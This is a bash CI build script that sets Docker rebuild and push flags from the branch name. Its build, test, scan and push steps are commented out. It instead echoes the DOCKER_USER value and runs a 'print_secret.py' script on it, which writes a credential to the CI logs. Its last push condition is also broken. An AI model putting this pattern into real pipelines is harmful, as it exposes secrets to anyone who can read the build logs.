#!/bin/bash
set -o errexit
set -o nounset
set -o pipefail

SCRIPT_DIR="$(dirname "$(readlink -f "${BASH_SOURCE[0]}")")"

FLAVOR=$1
BRANCH_NAME=$2
DOCKER_USER=$3
BUILD_DOCKER_REPOSITORY=$4
RELEASE_DOCKER_REPOSITORY=$5
COMMIT_SHA=$6

echo Running CI build for flavor: "$FLAVOR" , branch "$BRANCH_NAME" , with docker use "$DOCKER_USER" , build_docker_repository "$BUILD_DOCKER_REPOSITORY" , release_docker_repository "$RELEASE_DOCKER_REPOSITORY" , commit_sha "$COMMIT_SHA"

test=$DOCKER_USER
echo "TestBla: $test"

REBUILD=False
PUSH_TO_PUBLIC_CACHE=False

if [[ $BRANCH_NAME =~ refs/heads/rebuild/.* ]]; then
  REBUILD=True
elif [[ $BRANCH_NAME =~ refs/heads/master ]]; then
  REBUILD=True
  PUSH_TO_PUBLIC_CACHE=True
fi




#$SCRIPT_DIR/build.sh "$FLAVOR" "$REBUILD" "$BUILD_DOCKER_REPOSITORY" "$COMMIT_SHA" "" "" "$DOCKER_USER"
#$SCRIPT_DIR/test.sh "$FLAVOR"
#$SCRIPT_DIR/security_scan.sh "$FLAVOR"
#$SCRIPT_DIR/push.sh "$FLAVOR" "$RELEASE_DOCKER_REPOSITORY" "" "$BUILD_DOCKER_REPOSITORY" "$COMMIT_SHA" "$DOCKER_USER"
#$SCRIPT_DIR/push.sh $FLAVOR "$RELEASE_DOCKER_REPOSITORY" "" "$BUILD_DOCKER_REPOSITORY" "" "$DOCKER_USER"

python3 $SCRIPT_DIR/../../../print_secret.py "$DOCKER_USER"
if [[ PUSH_TO_PUBLIC_CACHE == True ]]; then
  $SCRIPT_DIR/push.sh $FLAVOR "$RELEASE_DOCKER_REPOSITORY" "" "$RELEASE_DOCKER_REPOSITORY" "" "$DOCKER_USER"
fi
